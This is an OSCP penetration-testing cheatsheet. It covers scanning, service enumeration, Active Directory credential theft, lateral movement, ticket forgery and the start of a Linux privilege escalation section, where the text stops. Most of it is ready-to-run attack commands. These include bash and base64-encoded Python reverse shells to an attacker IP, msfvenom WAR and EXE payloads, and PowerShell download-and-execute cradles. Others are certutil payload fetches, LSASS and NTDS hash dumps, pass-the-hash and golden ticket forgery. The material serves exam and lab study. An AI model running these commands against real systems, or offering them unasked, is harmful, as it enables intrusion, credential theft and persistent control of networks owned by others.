# OSCP Cheatsheet

## Table of Contents

- [Scanning & Enumeration](#scanning--enumeration)
  - [Nmap Basics](#nmap-basics)
  - [Service Enumeration](#service-enumeration)
    - [SMB](#smb)
    - [NFS](#nfs)
    - [FTP](#ftp)
    - [Web/HTTP](#webhttp)
- [Reverse Shells](#reverse-shells)
  - [Bash Reverse Shell](#bash-reverse-shell)
  - [Python Reverse Shell (Base64 Encoded)](#python-reverse-shell-base64-encoded)
  - [Msfvenom JSP WAR Reverse Shell](#msfvenom-jsp-war-reverse-shell)
  - [Windows Meterpreter EXE Payload](#windows-meterpreter-exe-payload)
- [Remote Access](#remote-access)
  - [Windows Remote Management (WinRM)](#windows-remote-management-winrm)
  - [Remote Desktop (xfreerdp)](#remote-desktop-xfreerdp)
  - [Meterpreter Session Basics](#meterpreter-session-basics)
- [Active Directory](#active-directory)
  - [AD Enumeration](#ad-enumeration)
  - [Credential Access](#credential-access)
  - [Lateral Movement](#lateral-movement)
  - [Privilege Escalation (AD)](#privilege-escalation-ad)
  - [Persistence](#persistence)
  - [AD Quick Reference Checklist](#ad-quick-reference-checklist)
- [Privilege Escalation](#privilege-escalation)
  - [Linux](#linux)
    - [SUID Files](#suid-files)
    - [Linux Capabilities](#linux-capabilities)
    - [Cron Jobs](#cron-jobs)
    - [Overwrite Writable Cron Script](#overwrite-writable-cron-script)
    - [Writable Directories](#writable-directories)
    - [Docker](#docker)
  - [Windows](#windows)
    - [PowerUp.ps1](#powerupps1)
    - [Interpreting PowerUp Output](#interpreting-powerup-output)
    - [Msfvenom Service Executable and Restart](#msfvenom-service-executable-and-restart)
    - [Token Impersonation (Incognito)](#token-impersonation-incognito)
    - [Potato Attacks](#potato-attacks)
    - [AppLocker bypass](#applocker-bypass)
    - [Unattended installation files](#unattended-installation-files)
    - [Windows Privilege Escalation Checklist](#windows-privilege-escalation-checklist)
- [Password Cracking](#password-cracking)
  - [John the Ripper](#john-the-ripper)
  - [Hashcat](#hashcat)
  - [Unshadow](#unshadow)
  - [Hydra](#hydra)

---

## Scanning & Enumeration

### Nmap Basics

* **SYN Stealth Scan (Default)** - Fast and stealthy TCP port scan that doesn't complete the TCP handshake

```bash
nmap -sS <target>
```

* `-sS`: SYN scan (also called half-open scan) - sends SYN packets without completing the handshake
* Default scan type when run as root/administrator
* Fast and relatively stealthy (doesn't complete TCP connections)
* Requires root/administrator privileges to craft raw packets
* Most common scan type for initial reconnaissance

* **SYN Scan Without Host Discovery** - Useful when ICMP/ping is blocked but host is known/alive

```bash
nmap -sS -T4 -Pn <target>
```

* `-Pn`: Treats all hosts as online (skips host discovery/ping phase)
* `-T4`: Faster timing template for CTF/lab environments

* **TCP Connect Scan** - Completes full TCP handshake, works without root privileges

```bash
nmap -sT <target>
```

* `-sT`: TCP connect scan - completes full TCP three-way handshake
* Default scan type when run as non-root user
* Slower than SYN scan but doesn't require special privileges
* More likely to be logged by target systems
* Use when you don't have root access

* **UDP Scan** - Scans UDP ports (slower than TCP scans)

```bash
nmap -sU <target>
```

* `-sU`: UDP port scan
* Much slower than TCP scans (UDP is connectionless)
* Often combined with TCP scan: `nmap -sS -sU <target>`
* Common UDP ports: 53 (DNS), 67/68 (DHCP), 161 (SNMP), 123 (NTP)

* **NULL Scan** - Sends packets with no flags set (stealth scan)

```bash
nmap -sN <target>
```

* `-sN`: NULL scan - sends packets with no TCP flags set
* Stealth scan technique (may bypass some firewalls)
* Requires root privileges
* Works on systems that don't follow RFC 793 strictly

* **FIN Scan** - Sends packets with only FIN flag set (stealth scan)

```bash
nmap -sF <target>
```

* `-sF`: FIN scan - sends packets with only FIN flag set
* Stealth scan technique
* Requires root privileges
* Similar to NULL scan, may bypass some firewalls

* **Xmas Scan** - Sends packets with FIN, PSH, and URG flags set (stealth scan)

```bash
nmap -sX <target>
```

* `-sX`: Xmas scan - sends packets with FIN, PSH, and URG flags set (like a Christmas tree)
* Stealth scan technique
* Requires root privileges
* Named "Xmas" because the flags are "lit up" like a Christmas tree

* **Comprehensive Scan** - Combines multiple scan types and options

```bash
nmap -sS -sV -sC -O -p- <target>
```

* `-sS`: SYN scan
* `-sV`: Version detection
* `-sC`: Run default NSE scripts
* `-O`: OS detection
* `-p-`: Scan all 65535 ports (default scans top 1000 ports)
* Comprehensive scan for thorough enumeration

* **Version Detection Scan** - Probes open ports to determine service/version information

```bash
nmap -sV <target>
```

* `-sV`: Enables version detection, which probes open ports to determine what service and version is running on them

* **Ping Sweep (Network Discovery)** - Discovers live hosts on a network without port scanning

```bash
sudo nmap -sn ip/24
```

* `-sn`: Ping scan (skip port scan) - only checks if hosts are up, doesn't scan ports
* `ip/24`: Network range in CIDR notation (e.g., `10.10.10.0/24` scans 10.10.10.1-254)
* Requires root/administrator privileges (`sudo`) for ICMP ping and ARP requests
* Fast network discovery technique to identify active hosts before port scanning
* Uses ICMP echo requests, TCP SYN to port 443, TCP ACK to port 80, and ARP requests
* Useful for initial reconnaissance to map out the network topology
* Example: `sudo nmap -sn 10.10.10.0/24` scans all hosts in the 10.10.10.0/24 subnet

### Service Enumeration

#### SMB

* **SMB Share and User Enumeration** - Enumerates SMB shares and users on a target system

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <target>
```

* `-p 445`: Scans port 445 (SMB/CIFS)
* `--script=smb-enum-shares.nse,smb-enum-users.nse`: Runs NSE scripts to enumerate SMB shares and users
* `smb-enum-shares.nse`: Lists available SMB shares on the target
* `smb-enum-users.nse`: Enumerates users on the SMB server (may require credentials)

* **Metasploit SMB Share Enumeration** - Uses Metasploit auxiliary module to enumerate SMB shares

```bash
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS <target>
msf6 auxiliary(scanner/smb/smb_enumshares) > run
```

* `use auxiliary/scanner/smb/smb_enumshares`: Loads the SMB share enumeration auxiliary module
* `set RHOSTS <target>`: Sets the target IP address or range
* `run`: Executes the module to enumerate SMB shares

* **SMB Share Enumeration** - Lists all available SMB shares on a target without authentication

```bash
smbclient -L //<target> -N
```

* `smbclient`: Command-line SMB/CIFS client for accessing SMB shares
* `-L`: List flag - enumerates all available shares without connecting to a specific share
* `//<target>`: Specifies the target IP address (e.g., `//10.82.151.31`)
* `-N`: No password flag - attempts null session authentication (no password required)
* Useful for initial enumeration to discover available shares before attempting to access them
* Works when anonymous/null session access is enabled on the SMB server

* **SMB Client Connection** - Connects to an SMB share using smbclient

```bash
smbclient //<target>/<share>
```

* `smbclient`: Command-line SMB/CIFS client for accessing SMB shares
* `//<target>/<share>`: Specifies the target IP and share name (e.g., `//10.81.182.140/anonymous`)
* Once connected, use commands like `ls`, `get <file>`, `put <file>`, `cd <directory>`, `exit`

* **SMB Recursive Download** - Downloads files recursively from an SMB share

```bash
smbget -R smb://<target>/<share>
```

* `smbget`: Utility to download files from SMB shares
* `-R`: Recursive flag - downloads all files and subdirectories
* `smb://<target>/<share>`: Specifies the target IP and share name (e.g., `smb://10.81.182.140/anonymous`)

* **SMB Brute Force with CrackMapExec** - Performs brute force attack against SMB service using username list and password

```bash
nxc smb 10.82.151.31 -d thm.corp -u users.txt -p 'ResetMe123!' --continue-on-success
```

* `nxc`: CrackMapExec (NetExec) - network security tool for penetration testing
* `smb`: Target protocol (SMB/CIFS)
* `10.82.151.31`: Target IP address
* `-d thm.corp`: Domain name for authentication (optional - use when targeting domain-joined systems)
* `-u users.txt`: Username wordlist file (use `-u username` for single user)
* `-p 'ResetMe123!'`: Password to test (use `-P passwords.txt` for password wordlist)
* `--continue-on-success`: Continue testing even after finding valid credentials
* **Works with both**: Samba servers (Linux/Unix) and Windows SMB servers (standalone or Active Directory)
* Useful for password spraying attacks and credential enumeration
* Can also enumerate shares, sessions, and logged-in users with valid credentials

* **Active Directory targets** — Full workflow: [Active Directory](#active-directory) (enumeration → credentials → lateral movement → privilege escalation → persistence). Domain password spraying is in the NetExec example above.

#### NFS

* **NFS Share Enumeration** - Enumerates NFS shares, lists contents, and shows filesystem statistics

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <target>
```

* `-p 111`: Scans port 111 (rpcbind - port mapper service used by NFS)
* `--script=nfs-ls,nfs-statfs,nfs-showmount`: Runs NSE scripts to enumerate NFS shares
* `nfs-ls.nse`: Lists files and directories in exported NFS shares with permissions, UIDs, GIDs, and timestamps
* `nfs-statfs.nse`: Shows filesystem statistics (disk space, usage percentage, max file size, etc.)
* `nfs-showmount.nse`: Lists all exported NFS shares on the target

* **Mount NFS Share** - Mounts an NFS share locally to explore its contents

```bash
mkdir /tmp/nfs_mount
mount -t nfs <target>:/<share> /tmp/nfs_mount
cd /tmp/nfs_mount
ls -la
```

* `mkdir /tmp/nfs_mount`: Creates a local directory to mount the NFS share
* `mount -t nfs`: Mounts an NFS filesystem
* `<target>:/<share>`: Specifies the target IP and exported share path (e.g., `10.81.182.140:/var`)
* `/tmp/nfs_mount`: Local mount point directory
* After mounting, explore the share with standard Linux commands (`ls`, `cat`, `find`, etc.)

* **Unmount NFS Share** - Unmounts a mounted NFS share

```bash
umount /tmp/nfs_mount
```

* `umount`: Unmounts a filesystem from the mount point

#### FTP

* **FTP Connection with Netcat** - Connects to FTP server using netcat to interact with the service

```bash
nc <target> 21
```

* `nc`: Netcat - network utility for reading from and writing to network connections
* `<target>`: Target IP address (e.g., `10.81.182.140`)
* `21`: FTP port number
* After connecting, you can interact with the FTP server directly (try `USER anonymous`, `PASS anonymous`, `HELP`, etc.)

* **FTP Client Connection** - Connects to FTP server using ftp client

```bash
ftp <target>
```

* `ftp`: FTP client command-line tool
* `<target>`: Target IP address (e.g., `10.81.182.140`)
* Common FTP commands: `ls`, `cd <directory>`, `get <file>`, `put <file>`, `binary`, `ascii`, `passive`, `quit`

* **General FTP Client Commands** - Common interactive commands for enumeration and file transfer

```bash
ftp <target>
# Name: <username>
# Password: <password>
ls
cd <directory>
get <file>
put <file>
binary
passive
bye
```

* Use `ls` to list directories and `cd <directory>` to move through remote paths
* Use `get <file>` to download and `put <file>` to upload
* Use `binary` for non-text files and `passive` when active mode data connections fail
* Use `bye` or `quit` to close the session cleanly

* **FTP Anonymous Login** - Attempts anonymous login to FTP server

```bash
ftp <target>
# When prompted:
# Name: anonymous
# Password: anonymous (or press Enter)
```

* Many FTP servers allow anonymous access with username `anonymous` and any password (or blank)

* **FTP Enumeration with Nmap** - Enumerates FTP service and attempts anonymous login

```bash
nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-syst <target>
```

* `-p 21`: Scans port 21 (FTP)
* `--script=ftp-anon,ftp-bounce,ftp-syst`: Runs NSE scripts to enumerate FTP
* `ftp-anon.nse`: Checks if anonymous FTP login is allowed
* `ftp-bounce.nse`: Checks for FTP bounce attack vulnerability
* `ftp-syst.nse`: Retrieves system information from FTP server

#### Web/HTTP

* **Directory Brute Force with Gobuster** - Enumerates directories and files on a web server using wordlist

```bash
gobuster dir -u <http://target> -w /usr/share/wordlists/dirb/big.txt
```

* `gobuster`: Fast directory/file brute-forcing tool written in Go
* `dir`: Directory/file brute-forcing mode (use `dns` for subdomain enumeration, `vhost` for virtual hosts)
* `-u <http://target>`: Target URL (e.g., `http://10.201.64.95/`)
* `-w /usr/share/wordlists/dirb/big.txt`: Wordlist file to use for brute-forcing
* **Common wordlists**:
  * `/usr/share/wordlists/dirb/big.txt` - Large wordlist (20k+ entries)
  * `/usr/share/wordlists/dirb/common.txt` - Common directories (4k+ entries)
  * `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` - Medium wordlist
  * `/usr/share/wordlists/dirb/small.txt` - Small wordlist (900+ entries)
* **Common options**:
  * `-x <extensions>`: File extensions to search for (e.g., `-x php,txt,html,js`)
  * `-t <threads>`: Number of concurrent threads (default: 10)
  * `-k`: Skip SSL certificate verification (for HTTPS)
  * `-s <status>`: Status codes to show (e.g., `-s 200,204,301,302,307,401,403`)
  * `-q`: Quiet mode - minimal output
  * `-o <file>`: Output results to file
* Useful for discovering hidden directories, files, and web applications
* Example: `gobuster dir -u http://10.201.64.95/ -w /usr/share/wordlists/dirb/big.txt -x php,txt,html`

* **Start Python HTTP Server** - Serves files from the current directory over HTTP

```bash
python3 -m http.server 8000
```

* `python3 -m http.server 8000`: Starts a simple web server on port 8000
* Serves the current directory contents over HTTP
* Access from browser or tools at: `http://<attacker-ip>:8000`

---

## Reverse Shells

### Bash Reverse Shell

* **Bash Reverse Shell** - Creates a reverse shell connection back to the attacker's machine using bash

```bash
bash -i >& /dev/tcp/{ATTACKER-IP}/{PORT} 0>&1
```

* `bash -i`: Starts an interactive bash shell
* `>& /dev/tcp/{ATTACKER-IP}/{PORT}`: Redirects stdout and stderr to a TCP connection to the attacker's IP and port
* `0>&1`: Redirects stdin (file descriptor 0) to stdout (file descriptor 1), completing the bidirectional connection
* Replace `{ATTACKER-IP}` with your attacking machine's IP address (e.g., `10.10.10.5`)
* Replace `{PORT}` with the port you're listening on (e.g., `4444`)
* **On attacker machine**, set up a listener first: `nc -lvnp <PORT>` or `rlwrap nc -lvnp <PORT>` (for better shell interaction)
* Example: `bash -i >& /dev/tcp/10.10.10.5/4444 0>&1`
* Works on systems with bash and `/dev/tcp` support (most Linux systems)

### Python Reverse Shell (Base64 Encoded)

* **Python reverse shell (base64-encoded)** - Encodes the payload to avoid quoting/special-character issues during command injection

```bash
echo 'python3 -c '"'"'import socket,subprocess,os;s=socket.socket();s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"'"'' | base64 -w 0
```

* Generate the base64 payload on the attacker machine
* Execute on target with: `echo <BASE64_STRING> | base64 -d | sh`

### Msfvenom JSP WAR Reverse Shell

* **Msfvenom JSP/WAR reverse shell** - Builds a `.war` web archive containing a JSP reverse TCP payload (e.g. Tomcat deployment)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o reverse.war
```

* `-p java/jsp_shell_reverse_tcp`: JSP reverse TCP shell payload
* `LHOST` / `LPORT`: Your listener IP and port
* `-f war`: Output as a WAR file for Java servlet containers
* `-o reverse.war`: Output filename
* Start a listener before the app runs the payload (e.g. `nc -lvnp <PORT>`), then deploy or trigger the WAR as the scenario allows

### Windows Meterpreter EXE Payload

* **Generate Windows reverse shell executable** - Common for post-exploitation when code execution is already available

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f exe -o reverse.exe
```

* `windows/meterpreter/reverse_tcp`: Staged Meterpreter payload for Windows
* `-f exe`: Outputs a Windows executable
* Use with a matching Metasploit handler (`exploit/multi/handler`)

---

## Remote Access

### Windows Remote Management (WinRM)

* **WinRM Connection with Evil-WinRM** - Connects to Windows Remote Management service for interactive shell access

```bash
evil-winrm -i <target> -u <username> -p '<password>'
```

* `evil-winrm`: Ruby-based tool for connecting to Windows Remote Management (WinRM) service
* `-i <target>`: Target IP address or hostname
* `-u <username>`: Username for authentication
* `-p '<password>'`: Password for authentication
* **WinRM (Windows Remote Management)**: Microsoft protocol for remote management of Windows systems
* Provides interactive PowerShell-like shell on Windows targets
* **Common ports**: 5985 (HTTP) and 5986 (HTTPS)
* **Use cases**:
  * Post-exploitation: After obtaining Windows credentials, use WinRM for persistent access
  * Lateral movement: Access other Windows systems in the network
  * Interactive shell: Better than reverse shells for Windows (PowerShell environment, file upload/download)
* **Common options**:
  * `-S`: Use SSL/TLS (HTTPS) - connects to port 5986
  * `-P <port>`: Specify custom port (default: 5985 for HTTP, 5986 for HTTPS)
  * `-s <script_path>`: Execute a PowerShell script on the target
  * `-e <exe_path>`: Upload and execute an executable
  * `-d <directory>`: Set base directory for file uploads/downloads
* **File operations** (once connected):
  * `upload <local_file>`: Upload file to target
  * `download <remote_file>`: Download file from target
  * `cd`, `ls`, `pwd`: Navigate filesystem
  * `Invoke-Binary`: Execute uploaded binaries
* Example: `evil-winrm -i 10.10.161.74 -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!'`
* **Pass-the-Hash** — Use `-H <NT_HASH>` instead of `-p` (see [Pass-the-Hash (PTH)](#pass-the-hash-pth))

### Remote Desktop (xfreerdp)

* **RDP from Linux** — Graphical desktop session (common in labs; port **3389/tcp**).

```bash
xfreerdp /u:<username> /p:'<password>' /v:<target> /dynamic-resolution +clipboard
```

* **Domain accounts** — Escape the backslash for the shell: `corp\\dark` not `corp\dark`.
* `/dynamic-resolution`: Resize the session with the window.
* `+clipboard`: Share clipboard (paste commands from the attacking machine).
* Non-default port: `/v:<target>:3389` or `/port:<n>` depending on `xfreerdp` version.
* Wrap passwords that contain shell metacharacters (`$`, `` ` ``, `!`, etc.) in **single quotes** on Linux.

### Meterpreter Session Basics

* **Upload / download** - Transfer files between your machine and the target

```text
upload /path/on/kali/file.exe C:\\Windows\\Temp\\file.exe
download C:\\Users\\user\\Desktop\\note.txt /tmp/note.txt
```

* **System shell (cmd)** - Spawns a regular Windows shell from the session

```text
shell
```

* **PowerShell from Meterpreter** - Load the extension, then open an interactive PowerShell session

```text
load powershell
powershell_shell
```

* **Download file from attacker web server (Windows target)**:

```powershell
powershell -c "wget http://<YOUR_IP>/reverse.exe -outfile reverse.exe"
certutil -urlcache -f http://<YOUR_IP>/payload.exe payload.exe
```

* **Leaving nested shells** - Type `exit` to leave `powershell_shell` or `shell` and return to the `meterpreter >` prompt
* **Background session** - `background` (or `bg`) sends the session to the background so you can use other Metasploit modules; `sessions -i <id>` to reattach
* **End the session** - `exit` from the `meterpreter >` prompt closes that Meterpreter session (use `background` first if you only want to step out)

---

## Active Directory

Typical OSCP/lab flow: **Enumeration → Credential Access → Lateral Movement → Privilege Escalation → Persistence**

### AD Enumeration

#### BloodHound / SharpHound

BloodHound maps attack paths in AD from data collected by SharpHound (Windows) or `bloodhound-python` (Linux).

* **Collect on target (Windows, in memory)** — Host `SharpHound.ps1` on your attacking machine:

```powershell
powershell -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp"
```

* `-CollectionMethod All`: Sessions, ACLs, trusts, group membership, GPOs
* Output: `.zip` files — transfer to your attacker box and import into BloodHound

* **Collect from Kali (with domain creds)**:

```bash
bloodhound-python -u <username> -p '<password>' -d <domain> -ns <DC_IP> -c All
```

* `-ns <DC_IP>`: Nameserver (Domain Controller IP)
* `-c All`: All collection methods
* Output: JSON files for BloodHound import

* **Run BloodHound GUI**:

```bash
sudo neo4j console &    # DB at http://localhost:7474
bloodhound &            # GUI — drag .zip or .json into Upload Data
```

* **Useful pre-built queries** (GUI):
  * Find all Domain Admins
  * Find Shortest Paths to Domain Admins
  * Find Principals with DCSync Rights
  * Find Computers where Domain Users are Local Admin
  * **Shortest Paths from Owned Principals** — mark a compromised node as Owned (right-click), then run this query for the path to DA

#### Enum4linux-ng

```bash
enum4linux-ng -A <target>
```

* `-A`: All checks (users, shares, groups, password policy, OS info)
* Modern rewrite of `enum4linux`; reliable on current Windows
* Useful **before** you have credentials (null session)

#### rpcclient

```bash
rpcclient -U "" -N <target>
```

* `-U ""`: Empty username (null session)
* `-N`: No password

* **Useful commands** (interactive shell):

```text
enumdomusers          # domain users
enumdomgroups         # domain groups
queryuser <RID>       # user details (e.g. queryuser 0x1f4)
querygroupmem <RID>   # group members
getdompwinfo          # password policy (check before spraying!)
netshareenum          # SMB shares
```

* **One-liner example**:

```bash
rpcclient -U "guest%" <target> -c "enumdomusers"
```

#### NetExec (CrackMapExec) — AD

* **Validate credentials** (see also [SMB](#smb)):

```bash
nxc smb <DC_IP> -d <domain> -u <user> -p '<password>'
```

* `[+]` = valid creds; `(Pwn3d!)` = local admin on that host

* **Enumerate users, shares, groups**:

```bash
nxc smb <DC_IP> -d <domain> -u <user> -p '<password>' --users
nxc smb <target> -d <domain> -u <user> -p '<password>' --shares
nxc smb <DC_IP> -d <domain> -u <user> -p '<password>' --groups
```

* **Remote command** (if local admin):

```bash
nxc smb <target> -d <domain> -u <user> -p '<password>' -x "whoami"
```

* `-x`: `cmd.exe`; `-X`: PowerShell

#### SID Enumeration (Impacket)

```bash
lookupsid.py <domain>/<username>@<target>
```

* Enumerates domain SID, users, groups, and aliases via MS-RPC
* Often works with `guest` or weak creds
* Example: `lookupsid.py thm.corp/guest@10.82.151.31`

#### LDAP Enumeration

```bash
ldapsearch -x -H ldap://<target> -b "dc=<domain>,dc=<tld>" > ldapsearch.txt
```

* `-x`: Simple bind (anonymous if allowed)
* `-b`: Base DN (e.g. `"dc=thm,dc=local"`)
* Dumps users, groups, computers, OUs when null/anonymous LDAP bind works

---

### Credential Access

#### AS-REP Roasting

Targets accounts with **Do not require Kerberos preauthentication**. No domain creds needed.

```bash
GetNPUsers.py <domain>/ -no-pass -usersfile users.txt -dc-ip <DC_IP> -outputfile asrep_hashes.txt
```

* Output: `$krb5asrep$23$...` — crack with [Hashcat mode 18200](#hashcat)

#### Kerberoasting

Requires **any valid domain account**. Requests TGS tickets for accounts with SPNs.

* **Linux (Impacket)**:

```bash
GetUserSPNs.py <domain>/<user>:'<password>' -dc-ip <DC_IP> -outputfile kerberoast_hashes.txt
```

* **Enumerate SPNs (Windows)**:

```cmd
setspn -T <domain> -Q */*
```

* **Windows (Invoke-Kerberoast in memory)**:

```powershell
powershell -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty Hash | Out-File -Encoding ASCII hashes.txt"
```

* Output: `$krb5tgs$23$...` — crack with [Hashcat mode 13100](#hashcat)
* **vs AS-REP**: Kerberoasting needs creds; AS-REP targets no-preauth accounts without creds

#### Password Spraying

Test **one password** against many users to reduce lockout risk. Check policy first (`rpcclient` → `getdompwinfo`).

```bash
nxc smb <DC_IP> -d <domain> -u users.txt -p 'Password123!' --continue-on-success | grep "+"
```

```bash
kerbrute passwordspray -d <domain> --dc <DC_IP> users.txt 'Password123!'
```

* `kerbrute` uses Kerberos (often quieter than SMB)
* Try seasonal passwords (`Season2024!`), company name, `Welcome1`

#### Dump LSASS (Meterpreter)

Requires **SYSTEM** or elevated admin. See [Meterpreter Session Basics](#meterpreter-session-basics).

```text
load kiwi
creds_all            # NTLM, Kerberos, cleartext (like sekurlsa::logonpasswords)
lsa_dump_sam         # local SAM hashes
lsa_dump_secrets     # LSA secrets (service account passwords)
```

* If `kiwi` fails, use `hashdump` for local hashes
* **Offline alternative** — dump then parse on Kali:

```bash
# On target (Meterpreter shell)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# On Kali
pypykatz lsa minidump lsass.dmp
```

#### Dump SAM / NTDS (Impacket)

* **Local SAM** (non-DC):

```bash
secretsdump.py <domain>/<user>:'<password>'@<target>
```

* **NTDS.dit on DC** (all domain NTLM hashes — requires DA or DCSync rights):

```bash
secretsdump.py <domain>/<user>:'<password>'@<DC_IP> -just-dc-ntlm
```

* `-just-dc-ntlm`: NTLM hashes only (faster)
* Output format: `user:RID:LM:NT:::`

---

### Lateral Movement

#### Pass-the-Hash (PTH)

Use NTLM hash without the plaintext password. Hash format for Impacket: `LM:NT` — if no LM, use `aad3b435b51404eeaad3b435b51404ee:<NT_HASH>`.

```bash
psexec.py <domain>/<user>@<target> -hashes :<NT_HASH>
evil-winrm -i <target> -u <user> -H <NT_HASH>
smbexec.py <domain>/<user>@<target> -hashes :<NT_HASH>
nxc smb <target> -d <domain> -u <user> -H <NT_HASH> -x "whoami"
```

* See [WinRM](#windows-remote-management-winrm) for `evil-winrm` options

#### Pass-the-Ticket (PTT)

Inject a Kerberos ticket (`.ccache`) into the session.

```bash
getTGT.py <domain>/<user> -hashes :<NT_HASH> -dc-ip <DC_IP>
export KRB5CCNAME=<user>.ccache
psexec.py -k -no-pass <domain>/<user>@<target_fqdn>
```

* `-k`: Use Kerberos (`KRB5CCNAME`)
* `-no-pass`: No password prompt
* **Use FQDN**, not IP — Kerberos requires the hostname in the SPN

* **Windows (Rubeus)**:

```cmd
Rubeus.exe asktgt /user:<user> /rc4:<NT_HASH> /ptt
klist
```

#### Overpass-the-Hash

Convert NTLM hash to a Kerberos TGT — useful when raw PTH is blocked (SMB signing, Restricted Admin Mode).

```bash
getTGT.py <domain>/<user> -hashes :<NT_HASH> -dc-ip <DC_IP>
export KRB5CCNAME=<user>.ccache
wmiexec.py -k -no-pass <domain>/<user>@<target_fqdn>
```

#### Remote Execution Tools

| Tool | Port | Notes |
|------|------|-------|
| `evil-winrm` | 5985/5986 | Interactive PowerShell; upload/download |
| `psexec.py` | 445 | Writes service binary (noisy) |
| `smbexec.py` | 445 | Quieter; no permanent exe |
| `wmiexec.py` | 135 | Semi-interactive via WMI |
| `atexec.py` | 445 | Task Scheduler |

```bash
wmiexec.py <domain>/<user>:'<password>'@<target>
```

---

### Privilege Escalation (AD)

#### ACL Abuse (GenericAll / WriteDACL)

BloodHound often flags abusable ACLs on users or groups.

* **GenericAll on user** — reset password:

```powershell
Set-ADAccountPassword -Identity <target_user> -Reset -NewPassword (ConvertTo-SecureString 'Pwned123!' -AsPlainText -Force)
Set-ADUser -Identity <target_user> -Enabled $true
```

* **GenericAll on group** — add yourself:

```powershell
Add-ADGroupMember -Identity "Domain Admins" -Members <your_user>
```

* **WriteDACL** — grant yourself DCSync rights (PowerView in memory), then run [DCSync](#dcsync) / `secretsdump.py`
* Requires RSAT or execution on a DC for `Set-AD*` cmdlets

#### Typical Chain: AS-REP → DCSync

```text
1. GetNPUsers.py      → AS-REP hash (no preauth)
2. hashcat -m 18200   → cleartext password
3. nxc smb            → confirm creds / (Pwn3d!)?
4. secretsdump.py     → NTDS if DA or DCSync rights
5. evil-winrm -H      → shell as Administrator
```

---

### Persistence

#### DCSync

Simulates a DC replication request to pull password hashes from the DC.

```bash
secretsdump.py <domain>/<DA_user>:'<password>'@<DC_IP> -just-dc-ntlm
```

* Requires **DS-Replication-Get-Changes** + **DS-Replication-Get-Changes-All** (or Domain Admin)
* Output includes **krbtgt** hash → needed for [Golden Ticket](#golden-ticket)

* **Mimikatz (Windows)**:

```cmd
lsadump::dcsync /domain:<domain> /user:krbtgt
lsadump::dcsync /domain:<domain> /user:Administrator
```

#### Golden Ticket

Forge a TGT with the **krbtgt** NTLM hash. Access as any user; survives user password resets.

```bash
# From secretsdump: krbtgt:502:...:KRBTGT_NTLM_HASH:::
# Domain SID: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <domain> Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <domain>/Administrator@<DC_FQDN>
```

* **Mimikatz**: `kerberos::golden /user:Administrator /domain:<domain> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt`
* Default ticket lifetime ~10 years; independent of the user's password

#### Silver Ticket

Forge a TGS for a **specific service** using that service account's NTLM hash. No DC contact during use (quieter than Golden).

```bash
ticketer.py -nthash <SERVICE_NTLM> -domain-sid <DOMAIN_SID> -domain <domain> \
  -spn cifs/<fileserver>.<domain> <user_to_impersonate>
export KRB5CCNAME=<user_to_impersonate>.ccache
smbclient.py -k -no-pass //<fileserver_fqdn>/share
```

| | Golden Ticket | Silver Ticket |
|---|---------------|---------------|
| Hash needed | krbtgt | Service account |
| Scope | Entire domain | One service (SPN) |
| Talks to DC | Yes (on validation) | No |
| Noise | High | Lower |

---

### AD Quick Reference Checklist

```text
# ENUMERATION
enum4linux-ng -A <DC_IP>
rpcclient -U "" -N <DC_IP> -c "enumdomusers"
ldapsearch -x -H ldap://<DC_IP> -b "dc=x,dc=y"
bloodhound-python -u user -p pass -d domain -ns <DC_IP> -c All
lookupsid.py domain/guest@<DC_IP>

# CREDENTIAL ACCESS (no creds)
GetNPUsers.py <domain>/ -no-pass -usersfile users.txt -dc-ip <DC_IP>

# CREDENTIAL ACCESS (with creds)
GetUserSPNs.py <domain>/user:pass -dc-ip <DC_IP>
secretsdump.py <domain>/user:pass@<DC_IP>
nxc smb <DC_IP> -u users.txt -p 'Pass!' --continue-on-success

# LATERAL MOVEMENT
evil-winrm -i <target> -u user -H <NT_HASH>
psexec.py <domain>/user@<target> -hashes :<hash>
getTGT.py + export KRB5CCNAME + psexec.py -k -no-pass

# PRIVESC / PERSISTENCE
BloodHound: Shortest Paths to Domain Admins
secretsdump → krbtgt → ticketer.py (Golden Ticket)
lsadump::dcsync /user:krbtgt

# ALWAYS CHECK
whoami /groups
net group "Domain Admins" /domain
```

---

## Privilege Escalation

### Linux

#### SUID Files

* **Find SUID Files** - Searches for files with SUID (Set User ID) bit set, which can be exploited for privilege escalation

```bash
find / -perm -u=s -type f 2>/dev/null
```

* `find /`: Searches from root directory
* `-perm -u=s`: Finds files with SUID bit set (executes with owner's privileges)
* `-type f`: Only searches for files (not directories)
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* SUID files run with the privileges of the file owner, which can be exploited if the owner is root
* Common exploitable SUID binaries: `find`, `nmap`, `vim`, `nano`, `less`, `more`, `cp`, `mv`, etc.

* **Find SUID Files (Detailed Listing)** - Searches for SUID files with detailed file information to verify specific binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

* `find /`: Searches from root directory
* `-type f`: Only searches for files (not directories)
* `-perm -04000`: Finds files with SUID bit set using octal notation (04000 = SUID bit)
* `-ls`: Provides detailed listing similar to `ls -l` (shows permissions, owner, size, timestamps, etc.)
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
